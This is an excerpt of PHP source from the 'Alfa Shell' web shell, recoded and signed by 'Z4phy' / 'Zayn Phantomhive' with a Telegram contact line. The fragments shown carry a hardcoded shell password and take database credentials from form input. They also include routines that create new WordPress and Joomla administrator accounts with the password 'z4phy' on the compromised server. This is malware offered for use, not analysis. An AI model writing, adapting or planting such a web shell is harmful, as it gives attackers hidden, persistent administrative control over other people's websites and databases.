<?php
// Ada butuh sesuatu tuan? https://t.me/zaynphantomhive
...
define("__ALFA_DATA_FOLDER__", "Z4P_CODE");
...
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Alfa Recode By Z4phy ~</b></font></th></tr>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Alfa Shell Zayn Phantomhive ::..</title>
<style type="text/css">';?>
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'z4phy', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
...
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$wpSuccess = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AUsername: ".$admin."%0APassword: z4phy";
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'webadmin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'z4phy', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sysadmin.mikrotik@proton.me', 'inputSize' => '50')
);
create_table($table);
...
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$jomSuccess = "NEW JOOMLA ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/administrator/%0AUsername: ".$admin."%0APassword: z4phy";
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
